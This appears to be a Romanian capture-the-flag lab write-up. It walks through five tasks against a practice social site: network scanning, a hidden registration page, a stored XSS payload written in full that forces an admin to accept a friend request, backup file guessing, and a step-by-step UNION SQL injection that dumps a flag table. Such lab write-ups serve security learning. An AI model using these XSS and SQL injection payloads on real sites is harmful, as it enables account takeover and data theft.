TASK1:
SpeishFlag{amKIq07ziEvvtLZYRS69Uyh12sX7ERO0}

ip addr show
am dat pe 172.18.0.4 

ma gandesc la nmap pe host
nmap -sN 172.18.0.4 /16

gasesc 172.18.0.166
iau adresa 172.18.0.166 si vad ca are 80/tcp open http

si dupa dau
./webtunnel.sh 172.18.0.166 80 
si dupa in local browser ma conectez la localhost:8080

observ ca sunt pe http://localhost:8080/auth/fake_register
ma duc in register dau inspect si gasesc un comentariu 
cu register_real_one

si vreau sa ma  duc pe real one
http://localhost:8080/auth/register_real_one

imi facui cont pe site-ul Catz
dupa dadui login now si ma logai
si dupa dadui inspect la pagina si gasi flagul dand ctrl f dupa el


TASK2:
SpeishFlag{hLDsYzxt8TnYSbuoxjxRkVf4BfgRnn8K}

logat inapoi si fiind pe boss dau view source page gasesc main.js apoi il deschid

vad ca e destul sa apelez acceptFriend(boss_id) ca dupa merge 
acceptFriend(theboss); vad ca nu merge
dau inspect sa vad html si gasesc idul bossului 

div class="box profile-view" data-user-id="1"> fiind pe profilul lui the boss
rezulta ca id e 1, dupa apelez acceptFriend(1) si il vad

ma duc pe profilul meu si apelez in consola din inspect acceptFriend(1)
si ma uit la flag pe profilul bossului, dar vad ca tot nu am acces

prima data dau addFriendProfile(1);  // idul bossului
ma gandesc ca imi trebui un script de xss cu javascript
idul meu este 9 il gasi in inspect
Kat Nyan are id 6 tot in inspect

ma duc la mesajele cu Kat Nyan prietena lui The Boss,
trebuie un atac xss, cross site scripting 


scriptul pe care il dau ca mesaj prietenei bossului pentru ca doar
ea e prietena cu bossul si il poate trimite mai departe
cand bossul primeste mesajul se accepta automat cererea noastra de prietenie

javascript,  xss, il pusai aici ca e relativ scurt

<div style="display:none;">
    <form id="hiddenForm" action="/inside/message/send/1" method="post">
        <textarea name="message">
            <script>
                 $(document).ready(function()  {
                    if (window.authUserName === 'theboss') {
                        acceptFriend(9);
                    }
                });
            </script>
        </textarea>
    </form>
</div>
<script>
    $(document).ready(function()  {
        if (window.authUserName === 'nyan') {
            $('#hiddenForm').submit();
        }
    });
</script>

si vad flagul pe pagina lui boss, dupa ce se accepta cererea automat



TASK3:
SpeishFlag{3EcuZwUZfptVXsTiPYWe6y9ZGh0XVjtz}

dau pe profilul meu si dupa localhost:8080/ pun backup.sh
se descarca un script backup.sh care are o formula pentru calcularea date-ului

DATE=$(date +'%Y-%m-%d' -d "$(( RANDOM % 15 + 2 )) days ago")
observ ca e o formula si o bag in terminal si imi da data scrisa in formatul aaaa-ll-zz
observam si cat backup-orig.tar.gz /tmp/flag.tar.gz > backup-$DATE.tar.gz

asa ca am pus asta la finalul url-ului backup-$DATE.tar.gz   si incercai date din ultimele 
16 zile pana dadu backup-2024-01-07.tar.gz
dadu repede manual asa ca nu mai folosi niciun script ca dura cam multicel

dupa dau comanda 
tar ixvf backup-2024-01-07.tar.gz si gasesc fisierul flag.txt

cat flag.txt si observ flagul

buna melodia merge la taskurile viitoare)




TASK4:
SpeishFlag{ob0787TodOaqv6yMv41HLgdzFXygpp4x}

ip a s din nou
iau 172.30.36.4/24 nu mai e asta
nmap -sN de adresa si gasim
./webtunnel.sh 172.30.36.166 80
cum zice si in enunt trebuie sa facem sql injection, asa ca ajungem la urmatoare comanda
Incep prin a afla numarul de coloane al bazei de date si incerc comanda la rand pana vad ca la 9 primesc eroare
dupa localhost:8080/inside/p/' UNION SELECT 1, 2, 3, 4, 5, 6, 7, 8 FROM information_schema.tables -- x

dam ' UNION SELECT 1, 2, 3, 4, 5, 6, 7, 8 FROM information_schema.tables -- x
rezulta coloana 3's care o vedem 

dupa ajungem sa dam ' union select 1, 2, group_concat(distinct(table_schema) separator ','), 4, 5, 6, 7, 8 from information_schema.tables -- x
unde vedem web_442  un indiciu pentru tabela 
asta iti da prima coloana a matricei care se afla in baza de date cam
' UNION SELECT 1, 2, group_concat(table_name separator ','), 4, 5, 6, 7, 8 FROM information_schema.tables where table_schema='web_442' -- x

acum retiren flags35458 care apare dupa comanda de mai sus si mai pun un spatiu dupa flags'spatiu

' UNION SELECT 1, 2, group_concat(column_name separator ','), 4, 5, 6, 7, 8 FROM information_schema.columns where table_schema='web_442' and table_name='flags35458' -- x    

si acum vedem, neaparat spatiu dupa flags...ma batu juma de ora 1 ora spatiile..)
' UNION SELECT 1, 2, zaflag, 4, 5, 6, 7, 8 FROM web_442.flags35458 -- x

si in final ne rezulta flagul






TASK5:
SpeishFlag{xChdGIa42A0QsCVsrMhdOPfZaLZy8CWu}

am dat tcpdump pe dev-machine si am asteptat sa vad ce trafic am

gasi 
IP dev-machine > 172.32.105.166: ICMP dev-machine udp port 10364 unreachable,

ip dev machine 
ip a s - > 172.32.105.4/24

iau portul de la host unreacheable si dau 
nc -l -u 172.32.105.4 10364

imi aparu asta
NYAN.NYAN.NYAN.NYAN.NYAN.U3BlaXNoRmxhZ3t4Q2hkR0lhNDJBMFFzQ1Zzck1oZE9QZlphTFp5OENXdX0=NYAN.NYAN.NYAN.NYAN.NYAN.NYAN

am luat de pe net base64decode.org ca mi s-a parut mai lejer 

si imi apare

5€
5€
5€
5€
5€
SpeishFlag{xChdGIa42A0QsCVsrMhdOPfZaLZy8CWu}
`M`M`M`M`M`

cam mica bacnota de 5)


TASK6:
TO BE CONTINUED ANOTHER TIME
